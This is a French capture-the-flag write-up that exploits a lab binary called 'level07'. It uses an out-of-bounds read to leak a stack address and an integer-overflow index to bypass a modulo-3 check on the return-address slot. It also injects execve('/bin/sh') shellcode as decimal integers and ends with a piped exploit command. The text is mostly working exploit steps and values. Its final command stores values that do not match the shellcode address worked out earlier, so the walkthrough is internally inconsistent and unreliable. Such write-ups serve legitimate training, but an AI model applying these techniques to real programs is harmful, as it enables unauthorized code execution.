## Etape 1: Recuperer l'adresse du shellcode (Leak)

Le programme permet de lire hors bornes via la commande 'read'. On utilise l'index 4294967287 (qui correspond à -9 en non-signé) pour récupérer une adresse de la pile (stack) et ainsi contourner l'ASLR :

```shell
Input command: read
Index: 4294967287
# On obtient par exemple : Number at data[4294967287] is 4294956404 (0xffffd174)
```

--> L'adresse de base fuitée est `0xffffd174`. 
Pour viser notre shellcode situé dans le tableau 'data', nous ajoutons un offset. Nous visons l'index 4 (le milieu de notre NOP sled) pour plus de stabilité.
`0xffffd174 + 0x34` = **`0xffffd1a8`**
En décimal, notre adresse cible finale est : **`4294955432`**

## Etape 2: Calculer l'index pour l'EIP (Bypass modulo 3)

L'adresse de retour (EIP) se trouve à l'index 114 par rapport au début de 'data'. Cependant, le programme interdit les index multiples de 3 (114 % 3 == 0). On utilise un overflow d'entier pour créer un alias autorisé :

`114 + (2^32 / 4) = 1073741938`

--> L'index **1073741938** pointe au même endroit que 114 mais passe la sécurité.

## Etape 3: Preparation du Shellcode

Le shellcode est découpé en blocs de 4 octets et converti en entiers décimaux pour être injecté via 'store'. On évite les index multiples de 3.

- Bloc 1 (\x6a\x0b\x58\x99) : **2572749674** (Index 7)
- Bloc 2 (\x52\x68\x2f\x2f) : **791635026** (Index 8)
- Bloc 3 (\x73\x68\x68\x2f) : **795371635** (Index 10)
- Bloc 4 (\x62\x69\x6e\x89) : **2305714530** (Index 11)
- Bloc 5 (\xe3\x31\xc9\xcd) : **3452514787** (Index 13)
- Bloc 6 (\x80\x90\x90\x90) : **2425426048** (Index 14)

## Etape 4: Execution

Afin de maintenir stdin ouvert après l'exécution du shellcode, nous utilisons la commande `cat` en pipeline.

```shell
(python -c 'print "store\n4159090384\n1073741938\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"'; cat) | ./level07
```

--> Nous pouvons passer au level08 !